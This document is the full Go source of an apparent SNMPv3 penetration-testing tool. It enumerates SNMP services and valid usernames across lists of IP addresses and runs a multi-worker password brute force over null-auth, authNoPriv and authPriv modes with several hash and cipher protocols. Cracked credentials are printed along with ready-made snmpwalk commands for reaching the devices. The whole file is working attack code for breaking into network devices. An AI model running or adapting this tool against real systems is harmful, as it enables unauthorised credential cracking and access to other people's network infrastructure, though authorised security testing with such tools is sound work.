package main

import (
	"flag"
	"fmt"
	"log"
	"os"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/fatih/color"
	"github.com/gosnmp/gosnmp"
	"github.com/olekukonko/tablewriter"
)

type SNMPv3Client struct {
	client *gosnmp.GoSNMP
}

type SNMPv3Config struct {
	Target        string
	Port          int
	Username      string
	AuthProtocol  string // "SHA" or "MD5"
	AuthPassword  string
	PrivProtocol  string // "AES" or "DES"
	PrivPassword  string
	TimeoutSecs   int
	Transport     string // "udp" or "tcp"
	SecurityLevel string
}

type SNMPResult struct {
	IP           string
	Username     string
	Password     string
	EncPassword  string
	AuthProtocol string
	PrivProtocol string
	Success      bool
	Message      string
	Command      string
}

func NewSNMPv3Client(config *SNMPv3Config) (*SNMPv3Client, error) {
	client := &gosnmp.GoSNMP{
		Target:        config.Target,
		Port:          uint16(config.Port),
		Version:       gosnmp.Version3,
		Timeout:       time.Duration(config.TimeoutSecs) * time.Second,
		SecurityModel: gosnmp.UserSecurityModel,
		MsgFlags:      gosnmp.AuthPriv,
		SecurityParameters: &gosnmp.UsmSecurityParameters{
			UserName:                 config.Username,
			AuthenticationProtocol:   getAuthProtocol(config.AuthProtocol),
			AuthenticationPassphrase: config.AuthPassword,
			PrivacyProtocol:          getPrivProtocol(config.PrivProtocol),
			PrivacyPassphrase:        config.PrivPassword,
		},
		Transport: config.Transport,
	}

	err := client.Connect()
	if err != nil {
		return nil, fmt.Errorf("connect error: %v", err)
	}

	return &SNMPv3Client{client: client}, nil
}

func (c *SNMPv3Client) Get(oids []string, showDetails bool) (map[string]interface{}, error) {
	result, err := c.client.Get(oids)

	if showDetails {
		if usmParams, ok := c.client.SecurityParameters.(*gosnmp.UsmSecurityParameters); ok {
			fmt.Printf("\nSNMP Engine Details:\n")
			fmt.Printf("Authorization Engine ID (hex): %x\n", usmParams.AuthoritativeEngineID)
			fmt.Printf("Authorization Engine Boots: %d\n", usmParams.AuthoritativeEngineBoots)
			fmt.Printf("Authorization Engine Time: %d\n", usmParams.AuthoritativeEngineTime)

			fmt.Println("\nParsed Authorization Engine ID:")
			engineID := []byte(usmParams.AuthoritativeEngineID)
			parseEngineID(engineID)
		}
	}

	if err != nil {
		return nil, fmt.Errorf("get error: %v", err)
	}

	values := make(map[string]interface{})
	for _, variable := range result.Variables {
		values[variable.Name] = gosnmp.ToBigInt(variable.Value)
	}

	return values, nil
}

func (c *SNMPv3Client) Close() error {
	return c.client.Conn.Close()
}

func getAuthProtocol(protocol string) gosnmp.SnmpV3AuthProtocol {
	switch strings.ToUpper(protocol) {
	case "MD5":
		return gosnmp.MD5
	case "SHA":
		return gosnmp.SHA
	case "SHA224":
		return gosnmp.SHA224
	case "SHA256":
		return gosnmp.SHA256
	case "SHA384":
		return gosnmp.SHA384
	case "SHA512":
		return gosnmp.SHA512
	default:
		return gosnmp.NoAuth
	}
}

func getPrivProtocol(protocol string) gosnmp.SnmpV3PrivProtocol {
	switch strings.ToUpper(protocol) {
	case "AES":
		return gosnmp.AES
	case "DES":
		return gosnmp.DES
	default:
		return gosnmp.NoPriv
	}
}

func parseEngineID(engineID []byte) {
	if len(engineID) < 6 {
		fmt.Println("Engine ID too short to parse")
		return
	}

	format := engineID[0] >> 4
	enterpriseID := int32(engineID[0]&0x0F)<<24 | int32(engineID[1])<<16 | int32(engineID[2])<<8 | int32(engineID[3])

	enterpriseMap := loadEnterpriseIDs()
	enterpriseName := enterpriseMap[enterpriseID]
	if enterpriseName == "" {
		enterpriseName = "Unknown"
	}

	macBytes := engineID[5:]
	if len(macBytes) < 6 {
		fmt.Println("Not enough bytes for MAC address")
		return
	}
	macAddress := fmt.Sprintf("%02x:%02x:%02x:%02x:%02x:%02x",
		macBytes[0], macBytes[1], macBytes[2],
		macBytes[3], macBytes[4], macBytes[5])

	fmt.Printf("Engine ID Format: %d\n", format)
	fmt.Printf("Enterprise ID: %s (%d)\n", enterpriseName, enterpriseID)
	fmt.Printf("MAC Address: %s\n", macAddress)
}

func loadEnterpriseIDs() map[int32]string {
	content, err := os.ReadFile("enterpriseIDs.txt")
	if err != nil {
		fmt.Printf("Error reading file: %v\n", err)
		return make(map[int32]string)
	}

	lines := strings.Split(string(content), "\n")
	idMap := make(map[int32]string)

	for i := 0; i < len(lines)-1; i++ {
		if id, err := strconv.ParseInt(strings.TrimSpace(lines[i]), 10, 32); err == nil {
			if i+1 < len(lines) {
				idMap[int32(id)] = strings.TrimSpace(lines[i+1])
			}
		}
	}

	return idMap
}

func getIPList(ipList, ipFile string) []string {
	var ips []string
	if ipList != "" {
		// Handle comma-separated IPs
		for _, ip := range strings.Split(ipList, ",") {
			ip = strings.TrimSpace(ip)
			if ip != "" {
				ips = append(ips, ip)
			}
		}
	} else if ipFile != "" {
		uniqueIPs, err := uniqueLines(ipFile)
		if err != nil {
			log.Fatalf("Failed to read IP file: %v", err)
		}
		ips = uniqueIPs
	}
	return ips
}

func getResultMessage(err error) string {
	if err == nil {
		return "SNMP service detected"
	}
	return fmt.Sprintf("Error: %v", err)
}

func performEnumeration(ips []string, protocol string) []SNMPResult {
	results := []SNMPResult{}
	config := &SNMPv3Config{
		Port:         161,
		Username:     "myuser",
		AuthProtocol: "SHA",
		AuthPassword: "authpass",
		PrivProtocol: "AES",
		PrivPassword: "privpass",
		TimeoutSecs:  2,
		Transport:    protocol,
	}

	for _, ip := range ips {
		fmt.Printf("\n=== Testing IP: %s ===\n", ip)
		config.Target = ip
		client, err := NewSNMPv3Client(config)
		if err != nil {
			results = append(results, SNMPResult{
				IP:      ip,
				Success: false,
				Message: fmt.Sprintf("Connection failed: %v", err),
			})
			continue
		}
		defer client.Close()

		oids := []string{"1.3.6.1.2.1.1.1.0"}
		_, err = client.Get(oids, true)
		results = append(results, SNMPResult{
			IP:      ip,
			Success: err == nil,
			Message: getResultMessage(err),
		})
	}
	return results
}

func displayEnumResults(results []SNMPResult) {
	for _, result := range results {
		if result.Success {
			fmt.Printf("[+] %s: %s\n", result.IP, result.Message)
		} else if !strings.Contains(result.Message, "unknown username") {
			// Only display errors that are not "unknown username"
			fmt.Printf("[-] %s: %s\n", result.IP, result.Message)
		}
	}
}

func main() {
	ipList := flag.String("ips", "", "Comma-separated list of IPs to check")
	ipFile := flag.String("ipfile", "", "File containing list of IPs to check, one per line")
	userFile := flag.String("userfile", "", "File containing usernames to test")
	passFile := flag.String("passfile", "", "Password list for brute force")
	encFile := flag.String("encfile", "", "File containing encryption passwords")
	enumFlag := flag.Bool("enum", false, "Perform basic SNMP enumeration")
	bruteFlag := flag.Bool("brute", false, "Perform password brute force")
	userEnumFlag := flag.Bool("userenum", false, "Perform username enumeration")
	protocol := flag.String("protocol", "udp", "SNMP protocol to use (udp or tcp)")
	workers := flag.Int("workers", 10, "Number of workers for brute force")
	flag.Parse()

	if !*enumFlag && !*bruteFlag && !*userEnumFlag {
		log.Fatal("Must specify either --enum, --userenum, or --brute flag")
	}

	ips := getIPList(*ipList, *ipFile)
	if len(ips) == 0 {
		log.Fatal("No valid IP addresses provided")
	}

	if *enumFlag {
		results := performEnumeration(ips, *protocol)
		displayEnumResults(results)
	} else if *userEnumFlag {
		if *userFile == "" {
			log.Fatal("Username enumeration requires --userfile")
		}
		results := performUserEnum(ips, *userFile, *protocol)
		saveUserResults(results)
	} else if *bruteFlag {
		if *userFile == "" || *passFile == "" {
			log.Fatal("Brute force requires --userfile and --passfile")
		}
		results := performBruteForce(*userFile, *passFile, *encFile, *ipList, *ipFile, *protocol, *workers)
		displayBruteResults(results)
	}
}

func performUserEnum(ips []string, userFile string, protocol string) []SNMPResult {
	results := []SNMPResult{}
	usernames, err := loadUsernames(userFile)
	if err != nil {
		log.Fatalf("Failed to load usernames: %v", err)
	}

	config := &SNMPv3Config{
		Port:         161,
		AuthProtocol: "SHA",
		AuthPassword: "authpass",
		PrivProtocol: "AES",
		PrivPassword: "privpass",
		TimeoutSecs:  2,
		Transport:    protocol,
	}

	for _, ip := range ips {
		fmt.Printf("\n=== Testing IP: %s ===\n", ip)
		config.Target = ip

		for _, username := range usernames {
			config.Username = username
			client, err := NewSNMPv3Client(config)
			if err != nil {
				if strings.Contains(err.Error(), "unknown username") {
					continue
				}
				fmt.Printf("Failed to create SNMP client: %v\n", err)
				continue
			}
			defer client.Close()

			oids := []string{"1.3.6.1.2.1.1.1.0"}
			_, err = client.Get(oids, false)
			if err != nil {
				if strings.Contains(err.Error(), "unknown username") {
					continue
				}
			}

			// If we get here, the username is valid (either no error or an error other than "unknown username")
			results = append(results, SNMPResult{
				IP:       ip,
				Username: username,
				Success:  true,
			})
			fmt.Printf("[+] Valid username found on %s: %s\n", ip, username)
		}
	}
	return results
}

func loadUsernames(filename string) ([]string, error) {
	return uniqueLines(filename)
}

func saveUserResults(results []SNMPResult) {
	if len(results) == 0 {
		return
	}

	timestamp := time.Now().Format("20060102_150405")
	filename := fmt.Sprintf("foundusers_%s.txt", timestamp)

	var content strings.Builder
	for _, result := range results {
		content.WriteString(fmt.Sprintf("%s:%s\n", result.IP, result.Username))
	}

	err := os.WriteFile(filename, []byte(content.String()), 0644)
	if err != nil {
		fmt.Printf("Error saving results to file: %v\n", err)
		return
	}

	fmt.Printf("\nValid usernames saved to: %s\n", filename)
}

func uniqueLines(filename string) ([]string, error) {
	content, err := os.ReadFile(filename)
	if err != nil {
		return nil, err
	}

	// Create a map to store unique lines
	uniqueMap := make(map[string]bool)

	// Split content into lines and add to map
	lines := strings.Split(strings.TrimSpace(string(content)), "\n")
	for _, line := range lines {
		// Trim whitespace and skip empty lines
		line = strings.TrimSpace(line)
		if line != "" {
			uniqueMap[line] = true
		}
	}

	// Convert map keys back to slice
	var uniqueLines []string
	for line := range uniqueMap {
		uniqueLines = append(uniqueLines, line)
	}

	return uniqueLines, nil
}

func loadUserCombos(filename, ipList, ipFile string) ([]string, error) {
	var combos []string
	uniqueMap := make(map[string]bool)

	content, err := os.ReadFile(filename)
	if err != nil {
		return nil, err
	}

	lines := strings.Split(strings.TrimSpace(string(content)), "\n")
	var usernames []string
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		if strings.Contains(line, ":") {
			uniqueMap[line] = true
		} else {
			usernames = append(usernames, line)
		}
	}

	ips := getIPList(ipList, ipFile)
	if len(ips) > 0 {
		for _, ip := range ips {
			for _, username := range usernames {
				combo := fmt.Sprintf("%s:%s", ip, username)
				uniqueMap[combo] = true
			}
		}
	}

	for combo := range uniqueMap {
		combos = append(combos, combo)
	}

	return combos, nil
}

func performBruteForce(userFile, passFile, encFile, ipList, ipFile, protocol string, maxWorkers int) []SNMPResult {
	results := []SNMPResult{}
	var resultsMutex sync.Mutex
	foundUsers := make(map[string]bool)

	userCombos, err := loadUserCombos(userFile, ipList, ipFile)
	if err != nil {
		log.Fatalf("Failed to load user combinations: %v", err)
	}

	passwords, err := uniqueLines(passFile)
	if err != nil {
		log.Fatalf("Failed to load passwords: %v", err)
	}

	var encPasswords []string
	if encFile != "" {
		encPasswords, err = uniqueLines(encFile)
		if err != nil {
			log.Fatalf("Failed to load encryption passwords: %v", err)
		}
	} else {
		encPasswords = passwords
	}

	// Order auth protocols by most common first
	authProtos := []string{"SHA", "MD5", "SHA256", "SHA384", "SHA512", "SHA224"} // MD5 and SHA are most common
	privProtos := []string{"AES", "DES"}                                         // AES is more common than DES

	nullAuthCombos := int32(len(userCombos))
	authNoPrivCombos := int32(len(userCombos) * len(passwords) * len(authProtos))
	authPrivCombos := int32(len(userCombos) * len(passwords) * len(encPasswords) * len(authProtos) * len(privProtos))

	totalCombos := nullAuthCombos + authNoPrivCombos + authPrivCombos

	fmt.Printf("[*] Starting brute force with %d workers\n", maxWorkers)
	fmt.Printf("[*] Total combinations to test: %d\n", totalCombos)
	fmt.Printf("[*] Combinations breakdown:\n")
	fmt.Printf("    - NULL Auth: %d (users:%d)\n",
		nullAuthCombos, len(userCombos))
	fmt.Printf("    - AuthNoPriv: %d (users:%d × passwords:%d × auth_protocols:%d)\n",
		authNoPrivCombos, len(userCombos), len(passwords), len(authProtos))
	fmt.Printf("    - AuthPriv: %d (users:%d × passwords:%d × enc_passwords:%d × auth_protocols:%d × priv_protocols:%d)\n",
		authPrivCombos, len(userCombos), len(passwords), len(encPasswords), len(authProtos), len(privProtos))
	fmt.Printf("    - Total combinations: %d\n", totalCombos)

	var progress int32
	workChan := make(chan struct{ ip, username string })
	var wg sync.WaitGroup

	for i := 0; i < maxWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for combo := range workChan {
				resultsMutex.Lock()
				if foundUsers[combo.username] {
					resultsMutex.Unlock()
					continue
				}
				resultsMutex.Unlock()

				currentProgress := atomic.AddInt32(&progress, 1)
				if result := tryNullAuth(combo.ip, combo.username, protocol, currentProgress, totalCombos); result != nil {
					resultsMutex.Lock()
					results = append(results, *result)
					foundUsers[combo.username] = true
					resultsMutex.Unlock()
					continue
				}

				userFound := false
				for _, authProto := range authProtos {
					if userFound {
						break
					}
					for _, pass := range passwords {
						currentProgress = atomic.AddInt32(&progress, 1)
						if result := tryAuthNoPriv(combo.ip, combo.username, pass, authProto, protocol, currentProgress, totalCombos); result != nil {
							resultsMutex.Lock()
							results = append(results, *result)
							foundUsers[combo.username] = true
							resultsMutex.Unlock()
							userFound = true
							break
						}

						if userFound {
							break
						}

						for _, privProto := range privProtos {
							for _, privPass := range encPasswords {
								currentProgress = atomic.AddInt32(&progress, 1)
								if result := tryAuthPriv(combo.ip, combo.username, pass, privPass, authProto, privProto, protocol, currentProgress, totalCombos); result != nil {
									resultsMutex.Lock()
									results = append(results, *result)
									foundUsers[combo.username] = true
									resultsMutex.Unlock()
									userFound = true
									break
								}
							}
							if userFound {
								break
							}
						}
					}
				}
			}
		}()
	}

	for _, combo := range userCombos {
		parts := strings.Split(combo, ":")
		if len(parts) != 2 {
			continue
		}
		ip, username := parts[0], parts[1]
		workChan <- struct{ ip, username string }{ip, username}
	}

	close(workChan)
	wg.Wait()

	return results
}

func displayBruteResults(results []SNMPResult) {
	if len(results) == 0 {
		fmt.Println("\nNo valid credentials found.")
		return
	}

	fmt.Println("\nValid Users:")
	fmt.Println("==================")

	// Create and configure table
	table := tablewriter.NewWriter(os.Stdout)
	table.SetHeader([]string{"Host", "Username", "Auth Type", "Auth Protocol", "Auth Password", "Priv Protocol", "Priv Password", "Command"})
	table.SetBorders(tablewriter.Border{Left: true, Top: true, Right: true, Bottom: true})
	table.SetCenterSeparator("|")
	table.SetAutoWrapText(false)
	table.SetRowLine(true)
	table.SetAutoFormatHeaders(true)
	table.SetHeaderColor(
		tablewriter.Colors{tablewriter.Bold, tablewriter.FgHiYellowColor},
		tablewriter.Colors{tablewriter.Bold, tablewriter.FgHiYellowColor},
		tablewriter.Colors{tablewriter.Bold, tablewriter.FgHiYellowColor},
		tablewriter.Colors{tablewriter.Bold, tablewriter.FgHiYellowColor},
		tablewriter.Colors{tablewriter.Bold, tablewriter.FgHiYellowColor},
		tablewriter.Colors{tablewriter.Bold, tablewriter.FgHiYellowColor},
		tablewriter.Colors{tablewriter.Bold, tablewriter.FgHiYellowColor},
		tablewriter.Colors{tablewriter.Bold, tablewriter.FgHiYellowColor},
	)

	for _, result := range results {
		authType := "NULL"
		authProto := "-"
		authPass := "-"
		privProto := "-"
		privPass := "-"

		if result.AuthProtocol != "" {
			if result.PrivProtocol != "" {
				authType = "authPriv"
				privProto = result.PrivProtocol
				privPass = result.EncPassword
			} else {
				authType = "authNoPriv"
			}
			authProto = result.AuthProtocol
			authPass = result.Password
		}

		table.Append([]string{
			result.IP,
			result.Username,
			authType,
			authProto,
			authPass,
			privProto,
			privPass,
			result.Command,
		})
	}

	table.Render()
}

func tryNullAuth(ip, username, protocol string, current, total int32) *SNMPResult {
	fmt.Printf("[*] [NULL Auth] Testing %s@%s (%d/%d)\n", username, ip, current, total)
	config := &SNMPv3Config{
		Target:      ip,
		Port:        161,
		Username:    username,
		Transport:   protocol,
		TimeoutSecs: 2,
	}

	client, err := NewSNMPv3Client(config)
	if err == nil {
		defer client.Close()
		oids := []string{"1.3.6.1.2.1.1.1.0"}
		_, err = client.Get(oids, false)
		if err == nil {
			color.Green("[+] [NULL Auth] SUCCESS: %s@%s", username, ip)
			walkCmd := fmt.Sprintf("snmpwalk -v3 -l noAuthNoPriv -u %s %s", username, ip)
			return &SNMPResult{
				IP:       ip,
				Username: username,
				Success:  true,
				Command:  walkCmd,
				Message:  "NULL auth",
			}
		}
	}
	return nil
}

func tryAuthNoPriv(ip, username, password, authProto, protocol string, current, total int32) *SNMPResult {
	fmt.Printf("[*] [AuthNoPriv] Testing %s@%s (Protocol:%s Auth:%s) (%d/%d)\n",
		username, ip, authProto, password, current, total)
	config := &SNMPv3Config{
		Target:        ip,
		Port:          161,
		Username:      username,
		AuthProtocol:  authProto,
		AuthPassword:  password,
		Transport:     protocol,
		TimeoutSecs:   2,
		SecurityLevel: "authNoPriv",
	}

	client, err := NewSNMPv3Client(config)
	if err != nil {
		return nil
	}
	defer client.Close()

	oids := []string{"1.3.6.1.2.1.1.1.0"}
	_, err = client.Get(oids, false)
	if err != nil {
		return nil
	}

	color.Green("[+] [AuthNoPriv] SUCCESS: %s@%s (Protocol:%s Auth:%s)",
		username, ip, authProto, password)
	walkCmd := fmt.Sprintf("snmpwalk -v3 -l authNoPriv -u %s -a %s -A %s %s",
		username, authProto, password, ip)
	return &SNMPResult{
		IP:           ip,
		Username:     username,
		Password:     password,
		AuthProtocol: authProto,
		Success:      true,
		Command:      walkCmd,
		Message:      fmt.Sprintf("Auth: %s", authProto),
	}
}

func tryAuthPriv(ip, username, authPass, privPass, authProto, privProto, protocol string, current, total int32) *SNMPResult {
	fmt.Printf("[*] [AuthPriv] Testing %s@%s (Protocols:%s/%s Auth:%s Priv:%s) (%d/%d)\n",
		username, ip, authProto, privProto, authPass, privPass, current, total)
	config := &SNMPv3Config{
		Target:        ip,
		Port:          161,
		Username:      username,
		AuthProtocol:  authProto,
		AuthPassword:  authPass,
		PrivProtocol:  privProto,
		PrivPassword:  privPass,
		Transport:     protocol,
		TimeoutSecs:   2,
		SecurityLevel: "authPriv",
	}

	client, err := NewSNMPv3Client(config)
	if err != nil {
		return nil
	}
	defer client.Close()

	oids := []string{"1.3.6.1.2.1.1.1.0"}
	_, err = client.Get(oids, false)
	if err != nil {
		return nil
	}

	color.Green("[+] [AuthPriv] SUCCESS: %s@%s (Protocols:%s/%s Auth:%s Priv:%s)",
		username, ip, authProto, privProto, authPass, privPass)
	walkCmd := fmt.Sprintf("snmpwalk -v3 -l authPriv -u %s -a %s -A %s -x %s -X %s %s",
		username, authProto, authPass, privProto, privPass, ip)
	return &SNMPResult{
		IP:           ip,
		Username:     username,
		Password:     authPass,
		EncPassword:  privPass,
		AuthProtocol: authProto,
		PrivProtocol: privProto,
		Success:      true,
		Command:      walkCmd,
		Message:      fmt.Sprintf("Auth: %s, Priv: %s", authProto, privProto),
	}
}
